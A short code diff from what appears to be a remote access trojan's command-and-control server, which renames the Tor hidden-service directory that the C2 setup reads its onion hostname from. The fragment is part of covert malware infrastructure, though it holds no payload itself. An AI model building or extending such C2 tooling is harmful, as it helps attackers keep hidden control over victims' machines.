@@ -665,11 +665,11 @@ def run_c2_server():
     time.sleep(0.3)
     controller = connect_tor()
     try:
-        file = open('/var/lib/tor/artirat-server/hostname',"r")
+        file = open('/var/lib/tor/art1rat/hostname',"r")
         hostname = file.read()
         write_hostname(hostname)
     except:
-        os.system("sudo cat /var/lib/tor/artirat-server/hostname > artirat-client/config/hostname")
+        os.system("sudo cat /var/lib/tor/art1rat/hostname > artirat-client/config/hostname")
         
     print()
     c2_menu(manager)
